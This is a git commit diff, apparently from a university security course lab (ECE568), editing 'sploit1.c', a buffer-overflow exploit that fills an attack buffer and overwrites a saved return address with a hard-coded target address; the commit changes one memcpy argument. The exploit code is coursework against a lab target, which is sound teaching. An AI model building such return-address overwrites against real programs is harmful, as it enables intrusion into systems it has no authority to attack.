21cfe52f08a12695b3e69536342e0630ba33303c
Mahsa Naserifar <mahsa@render.com>
2020-01-29 21:40:39 -0500

    Test print

--- ECE568-lab1/sploits/sploit1.c
+++ ECE568-lab1/sploits/sploit1.c
@@ -37,7 +37,7 @@ main ( int argc, char * argv[] )
 	attack_buffer[BUF_TO_RET + 2] = (char) ((target >> 16) & 0xff);
 	attack_buffer[BUF_TO_RET + 3] = (char) ((target >> 24) & 0xff);
 
-	memcpy(attack_buffer[BUF_TO_RET], (char *)0x2021fe10, sizeof((char *)0x2021fe10));
+	memcpy(&attack_buffer[BUF_TO_RET], (char *)0x2021fe10, sizeof((char *)0x2021fe10));
 
 	printf("attack_buffer %s\n",attack_buffer);
 	printf("%x%x%x%x\n",attack_buffer[BUF_TO_RET],
